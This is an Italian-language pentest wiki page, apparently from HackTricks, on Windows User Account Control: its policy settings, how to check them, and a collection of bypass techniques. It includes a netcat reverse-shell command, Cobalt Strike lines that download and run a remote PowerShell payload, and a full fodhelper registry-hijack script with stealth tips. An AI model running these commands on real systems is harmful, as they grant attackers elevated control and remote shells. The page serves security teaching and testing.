# UAC - Controllo account utente

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita un **prompt di consenso per attività elevate**. Le applicazioni hanno diversi livelli di `integrity`, e un programma con un livello **alto** può eseguire operazioni che **potrebbero compromettere il sistema**. Quando UAC è abilitato, le applicazioni e i task vengono sempre **eseguiti nel contesto di sicurezza di un account non amministratore** a meno che un amministratore non autorizzi esplicitamente tali applicazioni/task ad avere accesso a livello amministrativo per essere eseguiti. È una funzione di comodità che protegge gli amministratori da modifiche involontarie ma non è considerata un confine di sicurezza.

Per ulteriori informazioni sui livelli di integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando UAC è attivo, a un utente amministratore vengono assegnati 2 token: un token di utente standard, per svolgere azioni regolari a livello normale, e uno con i privilegi amministrativi.

Questa [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) spiega in dettaglio come funziona UAC e include il processo di logon, l'esperienza utente e l'architettura di UAC. Gli amministratori possono usare le security policy per configurare come UAC opera in modo specifico per la loro organizzazione a livello locale (usando secpol.msc), o configurarlo e distribuirlo tramite Group Policy Objects (GPO) in un ambiente Active Directory. Le varie impostazioni sono discusse in dettaglio [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Ci sono 10 impostazioni di Group Policy che possono essere impostate per UAC. La tabella seguente fornisce dettagli aggiuntivi:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Chiave del registro         | Impostazione predefinita                                     |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabilitato                                                 |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabilitato                                                 |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Richiesta di consenso per binari non-Windows                 |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Richiesta delle credenziali sul desktop sicuro              |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Abilitato (predefinito per Home) Disabilitato (predefinito per Enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabilitato                                                 |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Abilitato                                                    |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Abilitato                                                    |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Abilitato                                                    |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Abilitato                                                    |

### Teoria del bypass UAC

Alcuni programmi vengono **autoelevati automaticamente** se l'**utente appartiene** al **gruppo amministratori**. Questi binari hanno nei loro _**Manifests**_ l'opzione _**autoElevate**_ con valore _**True**_. Il binario deve inoltre essere **signed by Microsoft**.

Molti processi auto-elevati espongono **funzionalità tramite oggetti COM o server RPC**, che possono essere invocate da processi in esecuzione con integrity di livello medio (privilegi a livello utente normale). Nota che COM (Component Object Model) e RPC (Remote Procedure Call) sono metodi che i programmi Windows usano per comunicare ed eseguire funzioni tra diversi processi. Per esempio, **`IFileOperation COM object`** è progettato per gestire operazioni su file (copia, cancellazione, spostamento) e può elevare automaticamente i privilegi senza mostrare un prompt.

Attenzione: alcune verifiche potrebbero essere effettuate, come controllare se il processo è stato eseguito dalla directory **System32**, che può essere bypassato ad esempio **iniettando in explorer.exe** o in un altro eseguibile situato in System32.

Un altro modo per bypassare questi controlli è **modificare la PEB**. Ogni processo in Windows ha un Process Environment Block (PEB), che include dati importanti sul processo, come il percorso dell'eseguibile. Modificando la PEB, un attaccante può falsificare (spoofare) la posizione del proprio processo malevolo, facendolo apparire come eseguito da una directory fidata (come system32). Queste informazioni falsificate ingannano l'oggetto COM inducendolo ad auto-elevare i privilegi senza chiedere il consenso dell'utente.

Quindi, per **bypassare** la **UAC** (elevare da livello di integrity **medio** a **alto**) alcuni attaccanti usano questo tipo di binari per **eseguire codice arbitrario** poiché verrà eseguito da un processo con integrity di livello **alto**.

Puoi **controllare** il _**Manifest**_ di un binario usando lo strumento _**sigcheck.exe**_ di Sysinternals. (`sigcheck.exe -m <file>`) E puoi **vedere** il **livello di integrity** dei processi usando _Process Explorer_ o _Process Monitor_ (di Sysinternals).

### Controllare UAC

Per confermare se UAC è abilitato esegui:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Se è **`1`** allora UAC è **attivato**, se è **`0`** o non esiste, allora UAC è **disattivato**.

Poi, controlla **quale livello** è configurato:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Se **`0`**, UAC non mostrerà prompt (come **disabilitato**)
- Se **`1`** all'amministratore viene **richiesto il nome utente e la password** per eseguire il binario con privilegi elevati (su Secure Desktop)
- Se **`2`** (**Always notify me**) UAC chiederà sempre conferma all'amministratore quando tenta di eseguire qualcosa con privilegi elevati (su Secure Desktop)
- Se **`3`** come `1` ma non necessario su Secure Desktop
- Se **`4`** come `2` ma non necessario su Secure Desktop
- Se **`5`**(**default**) chiederà all'amministratore di confermare l'esecuzione di binari non Windows con privilegi elevati

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Riepilogo

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

Tutte queste informazioni possono essere raccolte usando il modulo **metasploit**: `post/windows/gather/win_privs`

Puoi anche controllare i gruppi del tuo utente e ottenere il livello di integrità:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Nota che se hai accesso grafico alla vittima, UAC bypass è molto semplice: puoi semplicemente cliccare su "Yes" quando appare il prompt UAC

Il UAC bypass è necessario nella seguente situazione: **l'UAC è attivata, il tuo processo è in esecuzione in un contesto con livello di integrità medium, e il tuo utente appartiene al gruppo Administrators**.

È importante sottolineare che è **molto più difficile bypassare l'UAC se è impostata al livello di sicurezza più alto (Always) rispetto agli altri livelli (Default).**

### UAC disabled

Se l'UAC è già disabilitata (`ConsentPromptBehaviorAdmin` è **`0`**) puoi **eseguire una reverse shell con privilegi amministrativi** (livello di integrità elevato) usando qualcosa del tipo:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Molto** elementare UAC "bypass" (accesso completo al file system)

Se hai una shell con un utente che è nel gruppo Administrators puoi **montare la condivisione C$** via SMB localmente come un nuovo disco e avrai **accesso a tutto il file system** (anche la home dell'Administrator).

> [!WARNING]
> **Sembra che questo trucco non funzioni più**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass con cobalt strike

Le tecniche di Cobalt Strike funzioneranno solo se UAC non è impostato al livello di sicurezza massimo.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** hanno anche diversi moduli per bypass della **UAC**.

### KRBUACBypass

Documentazione e tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) che è una **compilazione** di diversi UAC bypass exploits. Nota che dovrai **compilare UACME usando Visual Studio o msbuild**. La compilazione creerà diversi eseguibili (come `Source\Akagi\outout\x64\Debug\Akagi.exe`), dovrai sapere **quale ti serve.**  
Dovresti **fare attenzione** perché alcuni bypass **potrebbero avviare altri programmi** che **avviseranno** l'**utente** che qualcosa sta accadendo.

UACME indica la **build dalla quale ogni tecnica ha iniziato a funzionare**. Puoi cercare una tecnica che interessa le tue versioni:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Inoltre, usando [this](https://en.wikipedia.org/wiki/Windows_10_version_history) ottieni la release di Windows `1607` dalle versioni build.

### UAC Bypass – fodhelper.exe (Registry hijack)

Il binario attendibile `fodhelper.exe` viene automaticamente elevato su Windows moderni. Quando viene avviato, interroga il percorso del registro per utente mostrato qui sotto senza validare il verbo `DelegateExecute`. Piantare un comando in tale chiave permette a un processo con Medium Integrity (l'utente è nel gruppo Administrators) di generare un processo con High Integrity senza prompt UAC.

Percorso del registro interrogato da fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Passaggi PowerShell (imposta il tuo payload, quindi attiva):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Note:
- Funziona quando l'utente corrente è membro di Administrators e il livello UAC è default/lenient (non Always Notify con restrizioni aggiuntive).
- Usa il percorso `sysnative` per avviare un PowerShell a 64-bit da un processo a 32-bit su Windows a 64-bit.
- Il payload può essere qualsiasi comando (PowerShell, cmd, o un percorso a un EXE). Evitare UI che richiedono prompt per maggiore stealth.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ dovrebbe funzionare)

### UAC Bypass with GUI

Se hai accesso a una **GUI puoi semplicemente accettare il prompt UAC** quando appare, non hai realmente bisogno di un bypass. Quindi ottenere accesso a una GUI ti permette di bypassare UAC.

Inoltre, se ottieni una sessione GUI che qualcuno stava usando (potenzialmente via RDP) ci sono **alcuni strumenti che saranno in esecuzione come administrator** da cui potresti **lanciare** un **cmd**, per esempio **come admin** direttamente senza che UAC richieda nuovamente l'elevazione, come [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Questo potrebbe essere un po' più **stealthy**.

### Noisy brute-force UAC bypass

Se non ti interessa essere rumoroso puoi sempre **eseguire qualcosa come** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) che **chiede di elevare i permessi finché l'utente non accetta**.

### Your own bypass - Basic UAC bypass methodology

Se dai un'occhiata a **UACME** noterai che **la maggior parte dei bypass UAC abusa di una vulnerabilità di Dll Hijacking** (principalmente scrivendo la malicious dll in _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trova un binary che **autoelevate** (verifica che quando viene eseguito funzioni a high integrity level).
2. Con procmon trova eventi "**NAME NOT FOUND**" che possono essere vulnerabili a **DLL Hijacking**.
3. Probabilmente dovrai **scrivere** la DLL all'interno di alcuni **percorsi protetti** (come C:\Windows\System32) dove non hai permessi di scrittura. Puoi bypassare questo usando:
1. **wusa.exe**: Windows 7,8 and 8.1. Permette di estrarre il contenuto di un CAB file all'interno di percorsi protetti (perché questo tool viene eseguito a high integrity level).
2. **IFileOperation**: Windows 10.
4. Prepara uno **script** per copiare la tua DLL nel percorso protetto ed eseguire il binary vulnerabile e autoelevated.

### Another UAC bypass technique

Consiste nel verificare se un **autoElevated binary** cerca di **leggere** dal **registry** il **nome/path** di un **binary** o **command** da **eseguire** (questo è più interessante se il binary cerca queste informazioni all'interno di **HKCU**).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
